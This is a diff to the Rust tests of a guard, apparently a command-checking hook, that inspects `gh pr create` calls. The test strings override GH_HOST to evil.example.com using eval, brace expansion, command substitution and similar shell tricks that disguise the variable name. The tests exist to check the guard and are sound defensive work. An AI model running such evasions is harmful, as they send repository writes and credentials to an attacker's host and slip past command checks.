@@ -6776,6 +6776,11 @@ mod tests {
                 // `eval` runs its words in this shell.
                 "eval 'export GH_HOST=evil.example.com'; gh pr create -R cameronsjo/x --title t",
                 "command export GH_HOST=evil.example.com; gh pr create -R cameronsjo/x --title t",
+                // Brace expansion builds the name, and the tokenizer now expands
+                // it as bash does (cadence-hooks#1096): `GH_HOS{T,}=x` exports
+                // `GH_HOST=x` and `GH_HOS=x`, so the host resolves outright
+                // rather than as unknown.
+                "export GH_HOS{T,}=evil.example.com; gh pr create -R cameronsjo/x --title t",
             ] {
                 let result = GhWriteGuard.run(&input_with(command, "/tmp"));
                 let meta = result
@@ -6801,7 +6806,6 @@ mod tests {
                 "(( GH_HOST += 1 )); gh pr create -R cameronsjo/x --title t",
                 // #548 review I2: a name the shell builds at expansion time.
                 "export GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
-                "export GH_HOS{T,}=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 r#"export GH_HOS$"T"=evil.example.com; gh pr create -R cameronsjo/x --title t"#,
                 "export GH_HOS`printf T`=evil.example.com; gh pr create -R cameronsjo/x --title t",
                 "declare -x GH_HOS${X}T=evil.example.com; gh pr create -R cameronsjo/x --title t",
